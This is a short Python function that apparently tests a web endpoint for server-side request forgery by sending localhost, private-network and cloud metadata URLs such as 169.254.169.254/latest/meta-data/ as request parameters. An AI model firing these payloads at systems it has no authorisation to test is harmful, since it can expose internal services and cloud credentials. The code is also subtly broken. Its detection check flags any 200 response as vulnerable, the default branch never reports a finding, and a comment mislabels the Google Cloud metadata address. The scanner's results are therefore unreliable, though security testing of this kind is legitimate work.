import requests # type: ignore

def ssrf_test(method, url, headers, body=None, parameter_fuzz_ssrf=None):
    body = {} if body is None else body
    ssrf_payloads = [
        "http://localhost",
        "http://127.0.0.1",
        "https://www.google.com",
        "http://ipinfo.io/ip",
        "http://169.254.169.254",  # AWS metadata endpoint
        "http://169.254.169.253",  # Google Cloud metadata endpoint
        "http://169.254.169.254/latest/meta-data/",  # AWS metadata endpoint
        "http://169.254.169.253/computeMetadata/v1/",  # Google Cloud metadata endpoint
        "http://192.168.0.1",
        "http://10.0.0.1",
    ]

    vulnerable = False
    method = "POST" if method == "GET" else method
    # param = input("[-] Parameter to test (additional): ")

    for payload in ssrf_payloads:
        if parameter_fuzz_ssrf:
            data = {**body, parameter_fuzz_ssrf: payload}
            response = requests.request(method, url, headers=headers, json=data)
            print(f"[-] Request to {payload} returned status code: {response.status_code}")
        
            # Check if response contains sensitive information, indicating a successful SSRF
            if response.status_code == 200 and "meta" or response.status_code == 200 and "metadata" in response.text.lower():
                print(f"\033[91m[!] Possible SSRF vulnerability detected with payload: {payload}\033[0m")
                vulnerable = True
        else:
            data = {**body, "url": payload}
            response = requests.request(method, url, headers=headers, json=data)
            print(f"[-] Request to {payload} returned status code: {response.status_code}")
                    

    if not vulnerable:
        print("\033[92m[v] No SSRF vulnerabilities detected.\033[0m")
